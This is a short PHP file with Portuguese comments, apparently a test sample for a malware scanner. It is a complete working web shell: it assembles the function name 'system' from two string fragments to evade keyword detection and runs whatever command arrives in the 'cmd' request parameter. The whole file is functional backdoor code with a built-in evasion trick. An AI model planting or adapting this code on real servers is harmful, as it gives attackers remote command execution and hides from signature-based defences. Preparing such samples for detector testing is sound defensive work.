<?php
// Amostra de teste com concatenação de strings

// O atacante quebra a palavra 'system' em duas partes
$parte1 = 'sys';
$parte2 = 'tem';

// A função maliciosa é montada dinamicamente
$funcao_maliciosa = $parte1 . $parte2;

if(isset($_REQUEST['cmd'])) {
    // E executada a partir da variável, sem nunca escrever 'system' no código
    $funcao_maliciosa($_REQUEST['cmd']);
}
?>